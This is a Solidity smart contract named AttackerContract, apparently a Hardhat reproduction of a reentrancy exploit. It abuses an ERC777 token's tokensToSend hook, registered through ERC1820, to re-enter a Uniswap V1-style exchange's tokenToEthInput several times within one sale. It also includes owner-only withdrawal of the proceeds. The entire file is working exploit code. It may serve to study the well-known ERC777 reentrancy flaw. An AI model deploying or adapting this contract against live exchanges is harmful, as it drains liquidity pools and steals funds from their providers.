pragma solidity ^0.8.7;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/introspection/ERC1820Implementer.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
contract AttackerContract is ERC1820Implementer, IERC777Sender, Ownable{
    
    IUniV1 private uni; 
    IERC20 private erc777;
    uint256 private callCount;
    uint256 private batch;
    uint256 private constant CALLCOUNT_LIMIT = 3;

    constructor(address _uni, address _erc777, address _erc1820) {
        uni = IUniV1(_uni);
        erc777 = IERC20(_erc777);
        bytes32 interfaceId = keccak256("ERC777TokensSender");
        IERC1820Registry(_erc1820).setInterfaceImplementer(address(this), interfaceId, address(this));
        _registerInterfaceForAddress(interfaceId ,address(this));
    }
    
    function trigger() external payable onlyOwner {
        uni.ethToTokenInput{value: msg.value}(0);
        uint256 balance = erc777.balanceOf(address(this));
        batch = balance / CALLCOUNT_LIMIT;
        callCount++;
        uni.tokenToEthInput(batch);

        uni.ethToTokenInput{value: address(this).balance}(0);
    }

    function withdraw() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
        erc777.transferFrom(address(this), msg.sender, erc777.balanceOf(address(this)));
    }

    function approveUni(uint256 amount) external onlyOwner{
        require(erc777.approve(address(uni), amount), "AttackerContract: approve failed");
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override{

        if (callCount == CALLCOUNT_LIMIT) {
            return;
        }
        console.log("enter");
        callCount++;
        uni.tokenToEthInput(batch);
    }

    receive() external payable{

    }

}

interface IUniV1 {
    
    function ethToTokenInput(uint256 min_tokens) external payable returns (uint256);

    function tokenToEthInput(uint256 token_sold) external payable returns(uint256);

}